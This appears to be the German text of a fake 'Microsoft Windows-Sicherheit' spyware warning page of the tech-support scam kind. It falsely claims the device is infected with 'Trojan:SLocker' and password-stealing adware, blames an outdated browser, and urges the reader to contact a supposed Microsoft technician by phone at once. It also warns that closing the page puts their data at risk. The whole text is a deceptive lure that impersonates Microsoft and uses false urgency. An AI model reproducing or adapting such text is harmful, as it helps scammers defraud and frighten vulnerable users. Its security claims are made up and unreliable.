Microsoft Windows-Sicherheit – Spyware-Warnung

** Microsoft Windows ist mit Trojan:SLocker infiziert **

Aufgrund der veralteten Version des Browsers ist ein kritischer Fehler aufgetreten. Aktualisieren Sie Ihren Browser so schnell wie möglich.

Auch bei veralteten Browserversionen sind folgende Fehler möglich:

  • > Verlust persönlicher und gespeicherter Daten
  • > Leck vertraulicher Informationen
  • > Browserfehler

Ein Microsoft Windows-Sicherheitsscan hat auf diesem Gerät potenziell unerwünschte Adware entdeckt, die Passwörter, Online-Identitäten, Finanzinformationen, persönliche Dateien, Bilder oder Dokumente stehlen kann.

Bitte setzen Sie sich umgehend mit uns in Verbindung, damit unser Techniker Ihnen den Entfernungsprozess telefonisch erklären kann.

Bitte wenden Sie sich umgehend an den Microsoft Windows-Support, um diese Bedrohung zu melden, Spoofing zu verhindern und den Zugriff auf dieses Gerät freizuschalten.

Das Schließen dieses Microsoft Windows gefährdet Ihre persönlichen Daten und unterbricht Ihre Microsoft Windows-Registrierung.
